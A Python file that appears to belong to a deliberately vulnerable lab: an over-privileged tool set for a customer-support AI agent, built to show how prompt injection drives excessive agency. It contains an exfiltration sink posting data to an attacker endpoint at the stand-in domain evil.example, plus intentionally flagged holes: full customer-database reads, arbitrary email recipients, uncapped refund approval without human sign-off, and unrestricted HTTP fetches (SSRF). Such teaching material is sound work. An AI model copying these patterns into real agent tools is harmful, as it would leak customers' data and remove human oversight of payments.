"""The Meeseeks toolbelt — intentionally over-broad, no least-privilege.

Every tool the agent can call. They hit real victim systems / the attacker
sink with no scoping, no allow-list, and no approval. This is the excessive-
agency surface: hand a Meeseeks these tools and one injected instruction and it
will happily exfiltrate the customer database.
"""

import json

import httpx

from app import seed

ATTACKER_DOMAIN = "evil.example"


class HttpSink:
    """Posts exfiltrated data to the attacker inbox (exfil-sink service)."""

    def __init__(self, exfil_url: str):
        self.exfil_url = exfil_url.rstrip("/")

    def collect(self, source: str, payload) -> None:
        try:
            httpx.post(
                f"{self.exfil_url}/collect",
                json={"source": source, "payload": payload},
                timeout=3,
            )
        except Exception:
            # Best-effort: the lab still "works" if the sink is down.
            pass


class Tools:
    def __init__(self, exfil_url: str, http=None):
        self.exfil_url = exfil_url
        self._sink = HttpSink(exfil_url)
        self._http = http or httpx
        self.approved_refunds: list[str] = []

    def read_tickets(self) -> tuple[str, bool]:
        return json.dumps(seed.tickets()), False

    def read_customer_db(self) -> tuple[str, bool]:
        # VULNERABILITY: full-table read, no scoping to the ticket's customer.
        return json.dumps(seed.customers()), True

    def send_email(self, to: str, body: str) -> tuple[str, bool]:
        # VULNERABILITY: arbitrary recipient. Anything sent to the attacker
        # domain is exfiltrated to the attacker inbox.
        domain = to.split("@")[-1].lower() if "@" in to else ""
        if domain == ATTACKER_DOMAIN:
            try:
                payload = json.loads(body)
            except Exception:
                payload = body
            self._sink.collect("refund-meeseeks", payload)
            return f"EXFILTRATED to {to}", True
        return f"email queued to {to}", True

    def approve_refund(self, ticket_id: str) -> tuple[str, bool]:
        # VULNERABILITY: no dollar cap, no human approval.
        self.approved_refunds.append(ticket_id)
        return f"refund {ticket_id} approved", True

    def http_get(self, url: str) -> tuple[str, bool]:
        # VULNERABILITY: unrestricted egress / SSRF.
        try:
            r = self._http.get(url, timeout=3)
            return r.text[:500], True
        except Exception as e:  # pragma: no cover - network dependent
            return f"error: {e}", True
